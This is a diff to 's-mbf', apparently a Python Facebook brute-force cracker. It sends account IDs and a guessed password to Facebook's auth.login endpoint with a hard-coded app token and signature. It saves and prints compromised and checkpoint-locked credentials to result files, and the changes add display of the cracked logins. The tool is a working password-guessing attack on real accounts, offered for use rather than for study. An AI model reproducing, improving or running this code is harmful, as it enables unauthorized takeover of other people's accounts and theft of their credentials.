@@ -24,7 +24,7 @@ def banner():
 	print(cyan('   _____ __  ______  ____',bold=True))
 	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
 	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
-	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.3',bold=True))
+	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.4',bold=True))
 
 try:
 	toket=open('toket/token.txt')
@@ -172,10 +172,10 @@ tap=[]
 crk=[]
 def main(arg):
         try:
-                dt={'user':arg,'pw':pas}
+                data={'user':arg,'pw':pas}
                 req=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                 js=json.loads(req.text)
-                if 'access_token' in js:
+                if 'access_token' in js.keys():
                         true='yeah'
                         live="%s|%s"%(arg,pas)
                         tap.append(true)
@@ -187,7 +187,8 @@ def main(arg):
                         f=open('result/found.txt','a')
                         f.write(tulis)
                         f.close()
-                elif 'www.facebook.com' in js['error_msg']:
+                        for i in open('result/found.txt','r').read().splitlines()[-1:]: print("\r\033[92m[FOUND]\033[97m %s               "%(i))
+                elif 'User must verify their account on www.facebook.com (405)' in js['error_msg']:
                         true='notbad'
                         cek.append(true)
                         CP="%s|%s"%(arg,pas)
@@ -199,6 +200,7 @@ def main(arg):
                         f=open('result/cek.txt','a')
                         f.write(wrt)
                         f.close()
+                        for i in open('result/cek.txt','r').read().splitlines()[-1:]: print("\r\033[93m[CHECKPOINT]\033[97m %s               "%(i))
                 crk.append(arg)
                 print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<"%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
         except: pass
@@ -210,7 +212,7 @@ try:
 	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
 	name=nam.json()['name']
 
-	upver='v.2.4'
+	upver='v.2.5'
 	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
 	if upver in str(requp):
 		print(yellow('\nNew version available. update your s-mbf now!'))
@@ -370,9 +372,17 @@ next=p.map(main,o)
 if len(file) == 0:
 	exit("%s[!] File empty\n"%(r))
 if 'yeah' in str(tap) or 'notbad' in str(cek):
-        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
+        print("\n\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
 else: print(f"\n[ {yellow(':(',bold=True)} ] nothing found")
 if len(tap) > 0:
+	print("FOUND:")
+	print("="*30)
+	for i in open('result/found.txt','r').read().splitlines()[-+len(tap):]: print(i)
+	print("="*30)
 	print("found result saved: result/found.txt")
 if len(cek) > 0:
+	print("\nCHCEKPOINT:")
+	print("="*30)
+	for i in open('result/cek.txt','r').read().splitlines()[-+len(cek):]: print(i)
+	print("="*30)
 	print("check result saved: result/cek.txt")
